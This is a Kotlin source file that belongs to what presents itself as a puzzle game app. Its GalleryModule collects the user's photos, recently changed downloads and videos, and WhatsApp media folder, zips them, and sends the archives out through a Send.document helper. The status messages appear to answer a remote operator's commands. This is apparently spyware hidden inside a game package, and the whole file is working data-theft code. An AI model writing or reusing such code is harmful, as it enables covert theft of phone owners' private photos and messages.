package com.puzzleblast.game.modules

import android.content.Context
import android.os.Environment
import com.puzzleblast.game.core.Send
import com.puzzleblast.game.util.Zip
import java.io.File

object GalleryModule {
    suspend fun folder(ctx: Context, path: String?): String {
        val root = if (path != null) File(path) else Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
        if (!root.exists()) return "🖼 path not found: ${root.absolutePath}"
        val dest = File(ctx.cacheDir, "gallery_${System.currentTimeMillis()}.zip")
        val parts = Zip.zipFolder(root, dest)
        parts.forEach { Send.document(it, "🖼 ${it.name}") }
        return "🖼 zipped ${parts.size} part(s) from ${root.name}"
    }

    suspend fun recent(ctx: Context, hrs: Int = 24): String {
        val cutoff = System.currentTimeMillis() - hrs * 3600_000L
        val dirs = listOf(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES)
        )
        val files = dirs.flatMap { it.walkTopDown().filter { f -> f.isFile && f.lastModified() > cutoff } }.toList()
        if (files.isEmpty()) return "🕐 no files modified in last ${hrs}h"
        val dest = File(ctx.cacheDir, "recent_${System.currentTimeMillis()}.zip")
        Zip.zipFiles(files, dest)
        Send.document(dest, "🕐 recent ${hrs}h · ${files.size} files")
        return "🕐 sent ${files.size} recent files"
    }

    suspend fun waMedia(ctx: Context): String {
        val wa = File(Environment.getExternalStorageDirectory(), "Android/media/com.whatsapp/WhatsApp/Media")
        if (!wa.exists()) return "💚 WA media not found"
        val dest = File(ctx.cacheDir, "wamedia_${System.currentTimeMillis()}.zip")
        val parts = Zip.zipFolder(wa, dest)
        parts.forEach { Send.document(it, "💚 ${it.name}") }
        return "💚 WA media sent (${parts.size} parts)"
    }
}
